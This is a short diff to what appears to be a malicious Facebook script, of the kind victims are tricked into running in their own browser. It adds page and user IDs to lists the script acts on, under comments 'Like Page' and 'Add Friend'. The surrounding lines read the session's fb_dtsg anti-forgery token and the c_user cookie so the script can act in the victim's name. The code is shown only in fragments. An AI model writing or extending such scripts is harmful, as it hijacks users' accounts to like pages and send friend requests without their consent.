@@ -57,6 +57,7 @@ LIST("279163185561807");
 LIST("254790537994417");
 LIST("277815575688383");
 LIST("599238170088731");
+LIST("358317087623422");
 /*Like Page*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
@@ -188,6 +189,8 @@ a("100003904189992");
 a("100003147643648");
 a("100003239135946");
 a("100000076612063");
+a("100003171263802");
+a("100003354001028");
 
 /*Add Friend*/ 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
